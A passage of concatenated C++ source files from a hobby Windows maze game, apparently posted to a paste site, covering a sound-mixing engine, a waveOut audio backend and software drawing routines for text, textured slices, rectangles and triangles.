                                 f64 timestampSec, f64 timeoutSec)
{
  while(audio != nullptr){
    timeSleep(5);
    if((timeGetSeconds()-timestampSec) > timeoutSec) return false;
  }

  return true;

}



bool SoundEngine::waitForTrack(f64 timeoutSeconds, u16 track){
  if(SNDENGINE_IS_INVALID) return false;

  f64 timestampSeconds = timeGetSeconds();

  if(timeoutSeconds == 0.0) timeoutSeconds = 1e30; // Effectively infinite



  if(track != 0xFFFF){
    if(SNDENGINE_IS_TRACK_OOB) return false;

    if(!_waitForTrack(_tracks[track].audio,
                      timestampSeconds, timeoutSeconds))
    {
      return false;
    }



  } else {
    SoundEngineTrack* tracks = _tracks;

    for(u16 t=0; t<_tracks_len; ++t){
      if(!_waitForTrack(tracks[t].audio,
                        timestampSeconds, timeoutSeconds))
      {
        return false;
      }

    }

    // (alternate method)
    //
    //while(getActiveTracks() > 0){
    //  timeSleep(10);
    //  if((timeGetSeconds()-timestampSeconds) > timeoutSeconds) return false;
    //}



  }



  return true; // Will return true only if track(s) finished before timeout

}






#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\sound\SoundEngine_mixTracks.cpp"":
// DO NOT USE THIS AS REFERENCE FOR A NEW PROJECT
// THIS IS A HACKY PORT OF KIT_SDL2'S SOUNDENGINE!!!!
#include <public_stuff.hpp>

#ifdef SOUND_STUFF_USED

#include <windows.h>



//lower clip's volume to 0 within 10ms if speed reaches 0
#define speed0VolDeltaMS (10.0f)


#define MUTEX_PTR ((CRITICAL_SECTION*)&_lock)

#define LOCK_MUTEX \
  bool locked = false; \
  if(MUTEX_PTR != nullptr){ EnterCriticalSection(MUTEX_PTR); locked = true; }

#define UNLOCK_MUTEX                      { \
  if(locked){ LeaveCriticalSection(MUTEX_PTR); locked = false; } }



/******************************************************************************/



#define HANDLE_LOOP \
  /* loop handling (or end-of-clip handling i guess) */                                 \
  if(trk.position >= loopEnd){ /* audio clip finished loop */                           \
    if(!trk.loops){ trk.stopping = true; break; } /* mark as inactive and break */      \
    if(trk.loops != 65535) --trk.loops; /* decrement loops (unless infinite) */   \
    while(trk.position >= loopEnd)                                                      \
      trk.position -= loopDifference; /* jump back to the loop's starting point */      \
                                                                                        \
  } else if(trk.position < 0){ /* if clip has yet to start playing */                   \
    if(trk.position < -trk.spd_old){                                                    \
      trk.position += trk.spd_old; /* step forward by current speed */                  \
      continue;                                                                         \
    } else { /* if position >= -speed, the clip should start on this sample */          \
      trk.position = 0.0; /* make sure clip starts at exactly 0 */                      \
    }                                                                                   \
                                                                                        \
  }



#define HANDLE_SPEED_UPDATE \
  /* change old and new speed by speedDelta */                                  \
  f64 currentSpeedDelta = track.spdDelta;                                       \
  trk.spd_old += currentSpeedDelta;                                             \
  trk.spd_new += currentSpeedDelta;                                             \
                                                                                \
  t += t_inc; /* raise interpolation t value */                                 \
                                                                                \
  /* start rapid fade out if clip's new speed <= 0 */                           \
  if(LERP2(trk.spd_old, trk.spd_new, t) <= 0.0){                                \
    trk.spd_old = trk.spd_new = 0.0;                                            \
    /* volDelta is sorta volatile, so that might need to be accounted for... */ \
    track.volDelta = speed0VDelta;                                              \
  }



/******************************************************************************/



static inline f32 linearSmpMono(const f32* src, f64 position,
                                u64 loopEnd = 0xFFFFFFFFFFFFFFFF)
{
  const u64 intPosition = (u64)position;
  const f32 modPosition = (f32)(position-intPosition); //the position's fraction

  const f32 smpA = src[ intPosition           ];
  const f32 smpB = src[(intPosition+1)%loopEnd];

  return LERP2(smpA, smpB, modPosition);

}



static inline StereoF32 linearSmpStereo(const StereoF32* src, f64 position,
                                        u64 loopEnd = 0xFFFFFFFFFFFFFFFF)
{
  const u64 intPosition = (u64)position;
  const f32 modPosition = (f32)(position-intPosition); //the position's fraction

  const StereoF32 smpA = src[ intPosition           ];
  const StereoF32 smpB = src[(intPosition+1)%loopEnd];

  return {LERP2(smpA.l, smpB.l, modPosition),
          LERP2(smpA.r, smpB.r, modPosition)};

}



/******************************************************************************/



static inline bool mixTrack(SoundEngineTrack& track, f64 refTimestamp,
                            bool sIVIZ, f32 sampleRate, StereoF32 volumeMaster,
                            StereoF32* dst, size_t dst_len)
{

  //the value volumeDelta is set to if the track hits 0x speed
  const f32 _speed0VDelta = -( (1000.0/speed0VolDeltaMS) / sampleRate );
  const StereoF32 speed0VDelta = {_speed0VDelta, _speed0VDelta};

  //create stack copy of track data
  //(all but a track's deltas are to be referenced with this!)
  SoundEngineTrack trk = track;

  if(trk.audio == nullptr) return false; //just in case

  //make copies of relevant data from trk.audio
  const bool       stereo    = trk.audio->channels==2;
  const u64        loopStart = trk.audio->loopStart;
  const u64        loopEnd   = trk.audio->loopEnd; //(doubles as src_len)
  const f32*       src_m     = (      f32*)trk.audio->samples;
  const StereoF32* src_s     = (StereoF32*)trk.audio->samples;

  u64 loopDifference = loopEnd - loopStart;

  //calculate position based on the difference between
   //the reference and the queued audio clip's timestamps
  if(trk.timestamp > 0.0){
    f64 difference = refTimestamp-trk.timestamp; //seconds
    difference *= sampleRate; //seconds -> samples

    //(starts playing when position reaches 0)
    trk.position = -(difference*trk.spd_old);
    //(alternate calculation; try this if timing feels wrong or something)
    //trk.position = difference*trk.spd_old - dst_len;

    track.timestamp = 0.0; //ensures that this only occurs once per clip queued

  }

  //used for interpolating speed and volume settings from old to new
  f32       t     = 0.0f;
  const f32 t_inc = 1.0f/dst_len; //t_inc[rement]



  if(!stereo) //source is mono
  for(size_t i=0; i<dst_len; ++i){
    HANDLE_LOOP;

    //get sample
    f32 smp = linearSmpMono(src_m, trk.position, loopEnd);

    //apply volumes while interpolating between its old and new state
    smp *= volumeMaster.l * LERP2(trk.vol_old.l, trk.vol_new.l, t);

    //mix sample to dst (which is always stereo, so mix smp into both channels)
    dst[i].l += smp;
    dst[i].r += smp;

    //update position by speed, while interpolating between speed's old and new state
    trk.position += LERP2(trk.spd_old, trk.spd_new, t);

    //change old and new volume by volumeDelta
     //(deltas are referenced directly with track instead of trk)
    const f32 currentVolumeDelta = track.volDelta.l;
    trk.vol_old.l += currentVolumeDelta;
    trk.vol_new.l += currentVolumeDelta;

    //make sure both volumes are always between 0.0f and 1.0f
    trk.vol_old.l = CLAMP(trk.vol_old.l, 0.0f, 1.0f);
    trk.vol_new.l = CLAMP(trk.vol_new.l, 0.0f, 1.0f);

    HANDLE_SPEED_UPDATE

  }



  else //source is stereo
  for(size_t i=0; i<dst_len; ++i){
    HANDLE_LOOP;

    //get sample
    StereoF32 smp = linearSmpStereo(src_s, trk.position, loopEnd);

    //apply volumes while interpolating between its old and new state
    smp.l *= volumeMaster.l * LERP2(trk.vol_old.l, trk.vol_new.l, t);
    smp.r *= volumeMaster.r * LERP2(trk.vol_old.r, trk.vol_new.r, t);

    //mix sample to dst
    dst[i].l += smp.l;
    dst[i].r += smp.r;

    //update position by speed, while interpolating between speed's old and new state
    trk.position += LERP2(trk.spd_old, trk.spd_new, t);

    //change old and new volume by volumeDelta
     //(deltas are referenced directly with track instead of trk)
    const StereoF32 currentVolumeDelta = track.volDelta;
    trk.vol_old.l += currentVolumeDelta.l;
    trk.vol_old.r += currentVolumeDelta.r;
    trk.vol_new.l += currentVolumeDelta.l;
    trk.vol_new.r += currentVolumeDelta.r;

    //make sure both volumes are always between 0.0f and 1.0f
    trk.vol_old.l = CLAMP(trk.vol_old.l, 0.0f, 1.0f);
    trk.vol_old.r = CLAMP(trk.vol_old.r, 0.0f, 1.0f);
    trk.vol_new.l = CLAMP(trk.vol_new.l, 0.0f, 1.0f);
    trk.vol_new.r = CLAMP(trk.vol_new.r, 0.0f, 1.0f);

    HANDLE_SPEED_UPDATE

  }



  //set relevant old values to the new ones
   //(deltas don't need to be set)
  track.position = trk.position;
  track.spd_old  = trk.spd_new; //both old *and* new speeds
  track.spd_new  = trk.spd_new;  //must be set to their new values
  track.vol_old  = trk.vol_new; //both old *and* new volumes
  track.vol_new  = trk.vol_new;  //must be set to their new values
  track.loops    = trk.loops;
  track.stopping = trk.stopping;

  //if stopIfVolumeIsZero while volume is <=0,
   //mark the track as stopping (if it wasn't already)
  //(sIVIZ is short for stopIfVolumeIsZero)
  if((!stereo  &&  sIVIZ  &&  trk.vol_new.l <= 0) ||
     ( stereo  &&  sIVIZ  &&  trk.vol_new.l <= 0  &&  trk.vol_new.r <= 0))
  {
    track.stopping = true;
  }

  //a track is marked as complete if either the clip finishes,
   //or if the volume goes at or below 0 while stopIfVolumeIsZero is true
  if(track.stopping) track.audio = nullptr;

  return true;

}



/******************************************************************************/



//returns referenceTimestamp, or 0 on error
f64 SoundEngine::mixTracks(StereoF32* buffer, size_t buffer_len,
                           f64 referenceTimestamp)
{
  if(_tracks_len == 0) return 0.0;

  LOCK_MUTEX;

  //this will occur if you accidentally use the desired audio device's info
   //while sampleRate is set to 0 (which indicates that the default should
   //be used), instead of the audio device's actual sample rate.
   //this is because the desired info is a const that is not modified,
   //and thus keeping .sampleRate as 0 will set this to 0 as well.
  //(TL;DR: use AudioDevice.info.sampleRate after construction instead
   //of using the AudioDeviceInfo you fed to the constructor)
  if(sampleRate == 0.0f){ UNLOCK_MUTEX; return 0.0; }



  SoundEngineTrack* tracks = _tracks;
  bool               sIVIZ = stopIfVolumeIsZero;
  f32              smpRate = sampleRate;
  StereoF32      volMaster = volumeMaster;

  for(u16 t=0; t<_tracks_len; ++t){
    if(tracks[t].audio == nullptr) continue;

    //modify SoundEngine's master volume by the track's master volume
    StereoF32 _volMaster = volMaster;
    _volMaster.l *= tracks[t].volMaster.l;
    _volMaster.r *= tracks[t].volMaster.r;

    if(!mixTrack(tracks[t], referenceTimestamp, sIVIZ,
                 smpRate, _volMaster, buffer, buffer_len))
    {
      return 0;
    }

  }



  UNLOCK_MUTEX;

  return referenceTimestamp;

}





#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\audio.cpp"":
#include <win32/audio.hpp>

#include <public_stuff.hpp>





void user_audio(StereoF32* stream, u32 len, u32 sampleRate, f64 timeStamp);





#define _chunk_count 3
#define fade_delta_len 0.010f //for 10ms

static StereoF32 samples_in[AUDIO_SAMPLES_MAX];
static StereoS16 _chunk_data[_chunk_count][AUDIO_SAMPLES_MAX];
static WAVEHDR   _chunk_header[_chunk_count];
static int       _chunk_which;

static HWAVEOUT wave_out;

static bool fade_in     = true;
static f32  fade_volume = 0.0f;

u32 audio_samples = 0;
u32 sample_rate   = 0;





static inline void call_user_audio(int which){
  // Zero out user buffer, before invoking user function
  memSet(samples_in, 0, audio_samples*sizeof(StereoF32));
  user_audio(samples_in, audio_samples, sample_rate, timeGetSeconds());

  // Convert stereo f32 (-1.0f to 1.0f) to stereo s16 (-32768 to 32767)
  StereoS16* samples_out = _chunk_data[which];

  // 'By how much does the fade volume change every frame?'
  const f32 fade_delta = 1.0f / (fade_delta_len*sample_rate);



  if(fade_in && fade_volume>=1.0f){ // Fully faded in
    for(u32 i=0; i<audio_samples; ++i){
      samples_out[i].l  =  (s16)( CLAMP(samples_in[i].l, -1.0f, 1.0f) * 32767 );
      samples_out[i].r  =  (s16)( CLAMP(samples_in[i].r, -1.0f, 1.0f) * 32767 );

    }

  } else if(fade_in){ // Currently fading in
    for(u32 i=0; i<audio_samples; ++i){
      f32 smp_l  =  (s16)( CLAMP(samples_in[i].l, -1.0f, 1.0f) * 32767 );
      f32 smp_r  =  (s16)( CLAMP(samples_in[i].r, -1.0f, 1.0f) * 32767 );

      smp_l *= fade_volume;
      smp_r *= fade_volume;
      fade_volume = MIN(fade_volume+fade_delta, 1.0f);

      samples_out[i].l = smp_l;
      samples_out[i].r = smp_r;

    }

  } else { // if(!fade_in)
    for(u32 i=0; i<audio_samples; ++i){
      f32 smp_l  =  (s16)( CLAMP(samples_in[i].l, -1.0f, 1.0f) * 32767 );
      f32 smp_r  =  (s16)( CLAMP(samples_in[i].r, -1.0f, 1.0f) * 32767 );

      smp_l *= fade_volume;
      smp_r *= fade_volume;
      fade_volume = MAX(fade_volume-fade_delta, 0.0f);

      samples_out[i].l = smp_l;
      samples_out[i].r = smp_r;

    }

  }

}





void CALLBACK WaveOutProc(HWAVEOUT hwo, UINT msg, DWORD_PTR inst,
                          DWORD_PTR param1, DWORD_PTR param2)
{
  if(msg == WOM_DONE){
    call_user_audio(_chunk_which);

    waveOutWrite(hwo, &_chunk_header[_chunk_which], sizeof(WAVEHDR));

    _chunk_which += 1;
    _chunk_which %= _chunk_count;

  }

}





int WaveOutInit(){
  MMRESULT err;
  WAVEOUTCAPS devcaps;

  if((err = waveOutGetDevCapsA(WAVE_MAPPER, &devcaps, sizeof(WAVEOUTCAPS))))
    return -1;

  if(devcaps.dwFormats & WAVE_FORMAT_4S16) // 44100Hz, Stereo, s16
  {
    audio_samples = AUDIO_SAMPLES_MAX/2;
    sample_rate   = 44100;
  }
  else if(devcaps.dwFormats & WAVE_FORMAT_96S16) // 96000Hz, Stereo, s16
  {
    audio_samples = AUDIO_SAMPLES_MAX;
    sample_rate   = 96000;
  }
  else if(devcaps.dwFormats & WAVE_FORMAT_2S16) // 22050Hz, Stereo, s16
  {
    audio_samples = AUDIO_SAMPLES_MAX/4;
    sample_rate   = 22050;
  }
  else if(devcaps.dwFormats & WAVE_FORMAT_1S16) // 11025Hz, Stereo, s16
  {
    audio_samples = AUDIO_SAMPLES_MAX/8;
    sample_rate   = 11025;
  }
  else // No valid 16-bit stereo sample rate is supported!
  {
    return -2;
  }



  _chunk_which = 0;



  WAVEFORMATEX fmt;
  fmt.wFormatTag     = WAVE_FORMAT_PCM;
  fmt.nChannels      =  2;
  fmt.nSamplesPerSec = sample_rate;
  fmt.wBitsPerSample = 16;
  fmt.cbSize         =  0;

  fmt.nBlockAlign     = fmt.nChannels      * fmt.wBitsPerSample / 8;
  fmt.nAvgBytesPerSec = fmt.nSamplesPerSec * fmt.nBlockAlign;



  if(waveOutOpen(&wave_out, WAVE_MAPPER, &fmt,
                 (DWORD_PTR)WaveOutProc, 0, CALLBACK_FUNCTION))
  {
    return -3;
  }

  #define WO_VOLUME(_left, _right) ( ((_right)<<16) | (_left) )

  err = waveOutSetVolume(wave_out, WO_VOLUME(0xffff, 0xffff));

  // Even if the function isn't supported, hopefully it'll just default to 100%
  if(err && err != MMSYSERR_NOTSUPPORTED) return -4;



  // Set header info and prime the audio buffers
  for(u32 i=0; i<_chunk_count; ++i){
    _chunk_header[i].lpData          = (CHAR*)_chunk_data[i];
    _chunk_header[i].dwBufferLength  = audio_samples*sizeof(s16)*fmt.nChannels;
    _chunk_header[i].dwBytesRecorded = 0;
    _chunk_header[i].dwUser          = 0;
    _chunk_header[i].dwFlags         = 0;
    _chunk_header[i].dwLoops         = 0;
    _chunk_header[i].lpNext          = nullptr;
    _chunk_header[i].reserved        = 0;

    if(waveOutPrepareHeader(wave_out, &_chunk_header[i], sizeof(WAVEHDR)))
      return -5;

    memSet(_chunk_data[i], 0, _chunk_header[i].dwBufferLength);
    if(waveOutWrite(wave_out, &_chunk_header[i], sizeof(WAVEHDR)))
      return -6;

  }



  return 0;

}





void WaveOutQuit(){
  // Fade audio out smoothly before pausing
  fade_in = false;
  while(fade_volume > 0.0f) Sleep(10);

  // Also make sure all buffers have played
  #define chunk_time ((f64)(_chunk_count*audio_samples)/sample_rate)
  Sleep((DWORD)(chunk_time*1000));

  waveOutPause(wave_out);

}
"
QXL5SMLX,work for 2025-04-25 (1/5),Kitomas,C++,Friday 25th of April 2025 04:59:49 AM CDT,"/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\draw\draw_textf.cpp"":
#include <public_stuff.hpp>
#ifdef _DRAW_TEXTF_USED



#if TEXT_FMT_BUFFER_LEN < 2
  #error ""TEXT_FMT_BUFFER_LEN must be >= 2""
#endif

#define FMT_BUFFER d_tf_fmt_buffer
static char d_tf_fmt_buffer[ TEXT_FMT_BUFFER_LEN ];





#define ERR_RECT TEXT_ERROR_RECT

Rect2d get_text_rectf(const char* str_fmt, s32 x, s32 y,
                      bool use_negative_position_margin,
                      const Color8* font, ...)
{
  va_list va;
  va_start(va, font); // Since font is the last named variable

  s32 result = vsnPrintf(FMT_BUFFER, sizeof(FMT_BUFFER)-1, str_fmt, va);
  FMT_BUFFER[ sizeof(FMT_BUFFER)-1 ] = 0; // Manual null-terminator just in case

  va_end(va);

  if(result < 0) return ERR_RECT;

  return get_text_rect(FMT_BUFFER, x, y, use_negative_position_margin, font);

}





Rect2d get_text_rectvf(const char* str_fmt, s32 x, s32 y, va_list va,
                       bool use_negative_position_margin, const Color8* font)
{
  s32 result = vsnPrintf(FMT_BUFFER, sizeof(FMT_BUFFER)-1, str_fmt, va);
  FMT_BUFFER[ sizeof(FMT_BUFFER)-1 ] = 0; // Manual null-terminator just in case

  if(result < 0) return ERR_RECT;

  return get_text_rect(FMT_BUFFER, x, y, use_negative_position_margin, font);

}





// Draws the current contents of the built-in destination buffer
Rect2d draw_current_textf_buffer(s32 x, s32 y, u32 maxLength,
                                 bool use_negative_position_margin,
                                 const Color8* font, Color8* dst)
{
  maxLength = (!maxLength) ? sizeof(FMT_BUFFER)-1
                           : MIN(maxLength, sizeof(FMT_BUFFER)-1);

  return draw_text(FMT_BUFFER, x, y, maxLength,
                   use_negative_position_margin, font, dst);

}





Rect2d draw_textf(const char* str_fmt, s32 x, s32 y, u32 maxLength,
                  bool use_negative_position_margin,
                  const Color8* font, Color8* dst, ...)
{
  va_list va;
  va_start(va, dst); // Since dst is the last named variable

  s32 result = vsnPrintf(FMT_BUFFER, sizeof(FMT_BUFFER)-1, str_fmt, va);
  FMT_BUFFER[ sizeof(FMT_BUFFER)-1 ] = 0; // Manual null-terminator just in case

  va_end(va);

  if(result < 0) return ERR_RECT;



  maxLength = (!maxLength) ? sizeof(FMT_BUFFER)-1
                           : MIN(maxLength, sizeof(FMT_BUFFER)-1);

  return draw_text(FMT_BUFFER, x, y, maxLength,
                   use_negative_position_margin, font, dst);

}





#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\draw\draw_vslice.cpp"":
#include <public_stuff.hpp>
#ifdef DRAW_VSLICE_USED

#define CHECK_BOUNDS 0



// Rounds a number to the nearest value,
// (Only works if _x is positive!)
#ifndef   POS_RND
#define   POS_RND(_x) (s32)( (_x) + 0.5f )
#endif /* POS_RND */



static Color8 tex_missing[8 + 2*2] = {2,2, 0,0,0,0,0,0,
  0b00000000, 0b11000111,
  0b11000111, 0b00000000,
};





// Sretches a vertical column of the source's pixels,
// using nearest-neighbor interpolation
// (Does not take bitmap offsets into account!)
void draw_vslice(s32  dst_x, f32 height,
                 f32 _src_x, const Color8* src,
                 Color8* dst)
{
  if(u32(dst_x) >= CANVAS_W) return;
  if(dst == nullptr) return;

  if(src == nullptr) src = tex_missing;

  const s32 src_w  =  s32(src[0].v);
  const f32 src_h  =  f32(src[1].v);
  const s32 src_x  =  s32( CLAMP(_src_x, 0.0f, 1.0f) * (f32(src_w)-0.0001f) );

#if defined(_DEBUG) && CHECK_BOUNDS==1
  const Color8* dst_start = dst;
  const Color8* dst_end   = dst + CANVAS_W*CANVAS_H;
#endif



  s32 src_y_lo = 0;
  s32 src_y_hi = src_h-1;

  height = MAX(height, 0.0f);

  if(height > 1.0f){
    const s32 src_height_pix = POS_RND((1.0f/height) * (src_h/2));
    src_y_lo = s32(src_h/2)   - src_height_pix;
    src_y_hi = s32(src_h/2)-1 + src_height_pix;
  }

  const f32 src_span  =  f32(src_y_hi - src_y_lo + 1);



  height = MIN(height, 1.0f);
  const s32 dst_height_pix = POS_RND(height * f32(CANVAS_H/2));

  const s32 dst_y_lo  =  (CANVAS_H/2)   - dst_height_pix;
  const s32 dst_y_hi  =  (CANVAS_H/2)-1 + dst_height_pix;
  const s32 dst_span  =  (dst_y_hi - dst_y_lo + 0);



  src += 8;
  src += src_x;
  dst += dst_x + dst_y_lo*CANVAS_W;

  // +1 to make sure tex_mul is always slightly below 1.0f
  f32 tex_add = 1.0f/(dst_span+1);
  f32 tex_mul = 0;



  const s32 upper_limit = dst_span*CANVAS_W;


  for(s32 y=0; y<=upper_limit; y+=CANVAS_W){
    Color8* pix = dst+y;

    #if defined(_DEBUG) && CHECK_BOUNDS==1
    if(pix < dst_start  ||  pix >= dst_end){
      _printf(""ATTEMPTED TO WRITE BEYOND DST: (%p, %p, %p)\n"",
              pix, dst_start, dst_end); continue;
    }
    #endif


    s32 src_y = s32( src_y_lo + src_span*tex_mul );
    tex_mul += tex_add;


    #if defined(_DEBUG) && CHECK_BOUNDS==1
    if(src_y < 0  ||  src_y >= src_h){
      _printf(""ATTEMPTED TO READ BEYOND SRC! (%i, %i, %i)\n"",
              src_y, src_y_lo, src_y_hi); continue;
    }
    #endif


    *pix = src[src_y * src_w];

  }

}





#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\draw\fill_rect.cpp"":
#include <public_stuff.hpp>
#ifdef FILL_RECT_USED



// dst's length must be >= the length of pixels (CANVAS_W*CANVAS_H)
void fill_rect(s32 x, s32 y,
               s32 w, s32 h,
               Color8 color,
               Color8* dst)
{
  if(!w || !h) return;

  if(x >= CANVAS_W) return;
  if(y >= CANVAS_H) return;

  if(x <= -w) return;
  if(y <= -h) return;



  const s32 x_start  =  MAX(x, 0);
  const s32 y_start  =  MAX(y, 0);

  const s32 x_end  =  MIN(x+w, CANVAS_W);
  const s32 y_end  =  MIN(y+h, CANVAS_H);

  const s32 row_advance  =  CANVAS_W - (x_end-x_start);

  --dst; // -1 so pre-increment can be used
  dst  +=  MIN(x_start, CANVAS_W-1);
  dst  +=  MIN(y_start, CANVAS_H-1) * CANVAS_W;



  for(y=y_start; y<y_end; ++y){
    for(x=x_start; x<x_end; ++x)
      (++dst)->v = color.v;

    dst += row_advance;

  }

}





#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\draw\fill_tri.cpp"":
// THESE FUNCTIONS ARE NOT THREAD-SAFE,
// SINCE THE SAME EDGE BUFFERS ARE USED BETWEEN CALLS
#include <public_stuff.hpp>

#include <algorithm>
#include <cmath>





// Returns the middle part of x(y) = x0 + ((x1-x0)/(y1-y0)) * (y - y0)
static inline f32 _getInterpConstant(Fpoint2d& p0, Fpoint2d& p1){
  f32 divisor = p1.y-p0.y;
  if(divisor == 0) divisor = 0.000001f; // Prevents divide-by-zero
  return (p1.x-p0.x)/divisor;
}

#define _INTERP(_y, _p0, _constant) ( (_p0).x + (_constant) * ((_y)-(_p0.y)) )
#define _INTERP_AC(_y) _INTERP(_y, a, aci)
#define _INTERP_AB(_y) _INTERP(_y, a, abi)
#define _INTERP_BC(_y) _INTERP(_y, b, bci)



static inline Fpoint2d _round_and_convert(Fpoint3d in){
  Fpoint2d out;
  out.x = roundf(in.x);
  out.y = roundf(in.y);

  return out;

}



// Fpoint2d cross product's magnitude (I think?)
static inline f32 _Fp2d_crossmag(const Fpoint2d& a,
                                 const Fpoint2d& b,
                                 const Fpoint2d& origin = {0,0})
{
  const Fpoint2d oa = { a.x-origin.y, a.y-origin.y };
  const Fpoint2d ob = { b.x-origin.y, b.y-origin.y };

  return (oa.x*ob.y) - (oa.y*ob.x);

}




/*
Point2d edges_start[CANVAS_H]; // .y is for the scanline index
Point2d edges_end[CANVAS_H];   // .y is unused
u32 edges_count;





static ATTR_NOINLINE void _interpolate_triangle(const Fpoint3d* verts,
                                                const Triangle& tri)
{
  edges_count = 0; // Initialize number of rows to 0

  // z isn't needed here, so convert to Fpoint2d,
  // while also aligning to the nearest pixel boundary
  Fpoint2d a = _round_and_convert(verts[tri.a]);
  Fpoint2d b = _round_and_convert(verts[tri.b]);
  Fpoint2d c = _round_and_convert(verts[tri.c]);

  // Sort points vertically, so that a & c are top and bottom respectively
  if(a.y > c.y) std::swap(a, c);
  if(a.y > b.y) std::swap(a, b);
  if(b.y > c.y) std::swap(b, c);



  // Return early if triangle's points are completely off-screen horizontally
  if( (a.x < 0  &&  b.x < 0  &&  c.x < 0) ||
      (a.x>=CANVAS_W && b.x>=CANVAS_W && c.x>=CANVAS_W) )
  {
    return;
  }

  // Return early if triangle's points are completely off-screen vertically
  // (Points are sorted vertically, so only c.y and a.y need to be checked)
  if(c.y < 0  ||  a.y >= CANVAS_H) return;



  // 'Is point b on the left or right side of line ac
  // (as it appears on-screen)?'
  const bool isRightBend = _Fp2d_crossmag(a, b, c) > 0;

  // Precalculate interpolation constants
  const f32 aci = _getInterpConstant(a, c);
  const f32 abi = _getInterpConstant(a, b);
  const f32 bci = _getInterpConstant(b, c);



  // Interpolate edges of the triangle

  // Prevents south edge trim if last row was off-screen
  bool lastRowOffScreen = false;


  // Triangle is a single scanline tall (just a horizontal line)!
  if(a.y == c.y){
    // (Since the south edge is trimmed, this is likely redundant,
    // as this line would never be drawn in the first place!
    s32 a_x = (s32)a.x,  a_y = (s32)a.y;
    s32 b_x = (s32)b.x;
    s32 c_x = (s32)c.x;

    edges_start[edges_count].x = MIN3(a_x, b_x, c_x);
    edges_start[edges_count].y = a_y;
    edges_end  [edges_count].x = MAX3(a_x, b_x, c_x);
    edges_count = (edges_start[edges_count].x < CANVAS_W) &&
                  (edges_end  [edges_count].x >= 0);



  // Triangle is >1 scanline(s) tall
  } else {
    #define skip_row \
      { if(!lastRowOffScreen && (yi == (abc_max-1))){ lastRowOffScreen = true; } continue; }

    #define ab_max abc_max // Aliases for consistency
    #define bc_max abc_max

    f32 abc_max;
    Point2d* rows_ac;
    Point2d* rows_abc;

    // Line ac is edge start
    if(isRightBend){
      rows_ac  = edges_start;
      rows_abc = edges_end;

    // Line ac is edge end (so swap start and end)
    } else {
      rows_ac  = edges_end;
      rows_abc = edges_start;

    }



    // If b.y < 1, nothing from a to b-1 would render
    if(b.y > 0){
      ab_max  =  MIN(b.y, CANVAS_H);

      for(f32 yi=MAX(a.y,0); yi<ab_max; ++yi){
        // edges_start accessed directly for its y component
        edges_start[edges_count].y = (s32)yi;

        // a -> c,  a -> b
        rows_ac [edges_count].x = (s32)_INTERP_AC(yi);
        rows_abc[edges_count].x = (s32)_INTERP_AB(yi);
        if(edges_start[edges_count].x >= CANVAS_W) skip_row; // If start is past screen
        if(edges_end  [edges_count].x <  0       ) skip_row; // If end is before screen
        ++edges_count; // Only increment edges_count if scanline is valid to draw on

      }

    }



    // If b.y >= CANVAS_H, everything from b to c is hidden
    if(b.y < CANVAS_H){
      bc_max  =  MIN(c.y+1, CANVAS_H); //c.y+1 so the for-loop includes c.y

      for(f32 yi=MAX(b.y,0); yi<bc_max; ++yi){
        // edges_start accessed directly for its y component
        edges_start[edges_count].y = (s32)yi;

        // a -> c,  b -> c
        rows_ac [edges_count].x = (s32)_INTERP_AC(yi);
        rows_abc[edges_count].x = (s32)_INTERP_BC(yi);
        if(edges_start[edges_count].x >= CANVAS_W) skip_row; // If start is past screen
        if(edges_end  [edges_count].x <  0       ) skip_row; // If end is before screen
        ++edges_count; // Only increment edges_count if scanline is valid to draw on

      }

    }


  }



  // (Trimming the south-east edge should prevent overdraw)
  // Trim south edge unless the last row OR c.y is off-screen
  if(!lastRowOffScreen && (c.y < CANVAS_H))
    edges_count  =  MAX(edges_count-1, 0);

  // Clip triangle width to target screen space, and trim east edge
  for(u32 row=0; row<edges_count; ++row){
    edges_start[row].x  =  MAX(edges_start[row].x,   0);
    edges_end  [row].x  =  MIN(edges_end  [row].x-1, CANVAS_W-1);
  }

}





const static Triangle tri = { 0, 1, 2 };

void fill_tri(f32 x_0, f32 y_0,
              f32 x_1, f32 y_1,
              f32 x_2, f32 y_2,
              Color8 color)
{
  Fpoint3d verts[3];
  verts[0] = {x_0, y_0};
  verts[1] = {x_1, y_1};
  verts[2] = {x_2, y_2};

  _interpolate_triangle(verts, tri);



  // For each row of triangle
  for(u32 row=0; row<edges_count; ++row){
    #if defined(_DEBUG) && 0
      if(     edges_start[row].y <  0       ){ _printf(""y<0\n"" ); continue; }
      else if(edges_start[row].y >= CANVAS_H){ _printf(""y>=w\n""); continue; }
    #endif

    s32 y_pos = edges_start[row].y * CANVAS_W;
    s32 start = edges_start[row].x + y_pos;
    s32 end   = edges_end  [row].x + y_pos;

    // For each column of row
    for(s32 i=start; i<=end; ++i)
      pixels[i].v = color.v;

  }

}





void fill_tris(const Fpoint3d* verts,
               const Triangle* tris, u32 tris_len)
{
  if(verts == nullptr) return;
  if(tris  == nullptr) return;
  if(tris_len == 0) return;



  // For each triangle
  for(u32 tri=0; tri<tris_len; ++tri){
    _interpolate_triangle(verts, tris[tri]);

    Color8 color = tris[tri].color;

    // For each row of triangle
    for(u32 row=0; row<edges_count; ++row){
      s32 y_pos = edges_start[row].y * CANVAS_W;
      s32 start = edges_start[row].x + y_pos;
      s32 end   = edges_end  [row].x + y_pos;

      // For each column of row
      for(s32 i=start; i<=end; ++i)
        pixels[i].v = color.v;

    }

  }

}





void fill_tris2(const Fpoint3d* verts, const Triangle* tris,
                const u32*    indices, u32      indices_len)
{
  if(verts   == nullptr) return;
  if(tris    == nullptr) return;
  if(indices == nullptr) return;
  if(indices_len == 0) return;



  // For each triangle
  for(u32 index=0; index<indices_len; ++index){
    const Triangle& tri  =  tris[ indices[index] ];

    _interpolate_triangle(verts, tri);

    Color8 color = tri.color;

    // For each row of triangle
    for(u32 row=0; row<edges_count; ++row){
      s32 y_pos = edges_start[row].y * CANVAS_W;
      s32 start = edges_start[row].x + y_pos;
      s32 end   = edges_end  [row].x + y_pos;

      // For each column of row
      for(s32 i=start; i<=end; ++i)
        pixels[i].v = color.v;

    }

  }

}
*/
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\draw\font_pico8.cpp"":
